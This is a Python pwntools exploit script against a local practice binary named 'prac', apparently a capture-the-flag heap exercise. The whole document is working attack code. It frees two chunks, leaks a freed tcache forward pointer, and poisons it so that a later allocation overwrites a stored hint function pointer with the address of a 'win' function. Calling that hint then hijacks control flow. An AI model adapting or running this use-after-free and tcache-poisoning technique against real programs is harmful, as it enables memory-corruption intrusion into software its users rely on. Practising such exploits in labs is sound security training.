#!/usr/bin/env python3
from pwn import *

global p
p = process('./prac')
elf = ELF('./prac')

def make(index, name):
    log.info('Make: {}'.format(index))
    p.sendlineafter(b'> ', b'm')
    p.sendlineafter(b'Clone ID:', str(index).encode())
    p.sendlineafter(b'Enter Name', name)

def name(index, name):
    log.info(f'name: {index}')
    p.sendlineafter(b'> ', b'n')
    p.sendlineafter(b'Clone ID: ', str(index).encode())
    p.sendlineafter(b'Enter Name', name)

def kill(index):
    log.info('Kill: {}'.format(index))
    p.sendlineafter(b'> ', b'k')
    p.sendlineafter(b'Clone ID:', str(index).encode())

def view(index):
    log.info('View: {}'.format(index))
    p.sendlineafter(b'> ', b'v')
    p.sendlineafter(b'Clone ID: ', str(index).encode())
    p.recvuntil(b'Name: ', timeout=0.1)
    result = p.recvline().strip()
    return result

def hint(index):
    log.info('Hint: {}'.format(index))
    p.sendlineafter(b'> ', b'h')
    p.sendlineafter(b'Clone ID: ', str(index).encode())
    return p.recvline()

make(0, b'AAAAAAAA')
make(1, b'AAAAAAAA')

kill(0) # free clone 0
kill(1) # free clone 1

# leak the fwd pointer
leak = u32(view(1))
log.critical('Leaked Pointer: {}'.format(hex(leak)))

# change fd pointer by 8 bytes to overlap with hint function pointer
log.critical('Hint Pointer: {}'.format(hex(leak + 8)))
name(1, p64(leak+8)) # fwd on 1 (ie the 2nd thing next allocated) is now 0's hint

# allocate new chunk to overwrite hint pointer
# this is the first item in the tcachebin ll, after this is allocated then a subsequent malloc will use
# our overwritten fwd ptr
make(2, b'AAAAAAAA')
# now 3's name overlaps with 0's hint *
make(3, p64(elf.symbols['win']))

hint(0)

p.interactive()
